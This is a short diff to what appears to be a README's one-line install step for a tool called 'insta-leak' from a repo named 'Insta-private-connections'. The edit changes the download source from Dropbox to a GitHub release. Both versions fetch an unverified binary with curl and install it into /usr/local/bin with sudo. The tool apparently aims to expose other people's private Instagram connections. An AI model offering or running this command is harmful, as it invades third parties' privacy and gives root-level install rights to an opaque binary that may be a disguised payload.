@@ -41,7 +41,7 @@
 ## ⚡ One-Line Install
 
 ```bash
-curl -L "https://www.dropbox.com/scl/fi/5qyfyab3854u82v33gdhk/insta-leak?rlkey=0abtulzno0k03e44pb8bdk3oh&st=x44y973j&dl=1" -o insta && chmod +x insta && sudo mv insta /usr/local/bin/insta
+curl -L "https://github.com/J0K3R-x-Anarchy/Insta-private-connections/releases/download/bin/insta-leak" -o insta && chmod +x insta && sudo mv insta /usr/local/bin/insta
 ```
 
 ---
